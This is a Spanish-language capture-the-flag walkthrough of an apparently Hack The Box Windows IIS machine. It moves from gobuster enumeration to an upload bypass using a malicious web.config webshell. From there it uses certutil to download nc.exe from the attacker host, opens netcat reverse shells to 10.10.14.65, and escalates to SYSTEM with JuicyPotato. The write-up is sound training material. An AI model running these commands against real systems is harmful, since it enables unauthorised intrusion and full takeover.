# Enumeración

Solo hay un http:

````
gobuster dir -u http://10.129.4.64  -w /usr/share/wordlists/kali-wordlists-master/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.4.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/kali-wordlists-master/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
UploadedFiles        (Status: 301) [Size: 156] [--> http://10.129.4.64/UploadedFiles/]
uploadedFiles        (Status: 301) [Size: 156] [--> http://10.129.4.64/uploadedFiles/]
uploadedfiles        (Status: 301) [Size: 156] [--> http://10.129.4.64/uploadedfiles/]
````

````
gobuster dir -u http://10.129.97.11/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,aspx,asp 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.97.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              asp,php,txt,bak,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
aspnet_client        (Status: 301) [Size: 157] [--> http://10.129.97.11/aspnet_client/]                                                                   
transfer.aspx        (Status: 200) [Size: 941]
uploadedfiles        (Status: 301) [Size: 157] [--> http://10.129.97.11/uploadedfiles/]                                                                   
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
````
<img width="910" height="277" alt="image" src="https://github.com/user-attachments/assets/8fd293bb-0389-4084-b707-5de8ac6fe608" />

Subidmos un txt mismo y vemos que extensiones se pemiten
<img width="1571" height="892" alt="image" src="https://github.com/user-attachments/assets/8a2e50d6-3f9d-40a9-bc18-93e1b90ef387" />

https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config


Tenemos archivo para hacer rce llmandolo web.config 

<img width="966" height="606" alt="image" src="https://github.com/user-attachments/assets/ab1c854a-d396-44fb-91df-15567747e5e7" />


Listo kalisto tenemos rce

````
### 3. SUBIR Y CONFIRMAR RCE ###
# Subo web.config por http://10.129.97.11/transfer.aspx
# !!! HTB borra los ficheros subidos cada ~1 min -> subir y navegar YA !!!
http://10.129.97.11/uploadedfiles/web.config?cmd=whoami
# -> bounty\merlin   (ejecución de comandos confirmada)

### 4. REVERSE SHELL con nc.exe ###
# EN KALI:
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80               # servir nc.exe
nc -lvnp 443                            # listener (otra pestaña)

# VÍA WEBSHELL (resubir web.config antes por el limpiador):
# comando 1 - descargar nc.exe:
http://10.129.97.11/uploadedfiles/web.config?cmd=certutil+-urlcache+-f+http://10.10.14.65/nc.exe+C:\Windows\Temp\nc.exe
# comando 2 - lanzar la shell:
http://10.129.97.11/uploadedfiles/web.config?cmd=C:\Windows\Temp\nc.exe+10.10.14.65+443+-e+cmd.exe

# -> shell como bounty\merlin en el listener
whoami
type C:\Users\merlin\Desktop\user.txt
````


Escalada:
````
whoami /priv              # SeImpersonatePrivilege = Enabled -> vía potato
systeminfo                # Server 2008 R2 x64 -> toca JuicyPotato (Windows viejo)

### 2. BINARIOS (JuicyPotato + nc de 32 BITS) ###
# KALI (en la carpeta que sirves):
wget .../ohpe/juicy-potato/.../JuicyPotato.exe     # potato de 2008/2012
wget .../int0x33/nc.exe                             # nc 32-bit (shell corre en IIS w3wp 32-bit)
python3 -m http.server 80
# VICTIMA:
certutil -urlcache -f http://10.10.14.65/JuicyPotato.exe C:\Windows\Temp\jp.exe
certutil -urlcache -f http://10.10.14.65/nc.exe C:\Windows\Temp\nc.exe
dir C:\Windows\Temp\jp.exe   # verifica tamaño (~340KB). Si 1KB = era 404, corrupto

### 3. REVERSE EN UN .BAT (evita que la shell trunque el comando largo) ###
echo C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.65 5555 > C:\Windows\Temp\s.bat

### 4. JuicyPotato -> SYSTEM ###
# KALI: nc -lnvp 5555       <- listener ARRIBA ANTES de disparar
C:\Windows\Temp\jp.exe -l 5555 -p cmd.exe -a "/c C:\Windows\Temp\s.bat" -t *
#   -p cmd.exe -a "/c nc..."  = cmd ENVUELVE al nc (clave: -p nc directo NO dispara)
#   -l 5555 puerto COM local  |  -t * prueba los dos métodos de token

### 5. FLAGS (shell ciega: dir NO ve ficheros, type SÍ) ###
type C:\Users\merlin\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
````



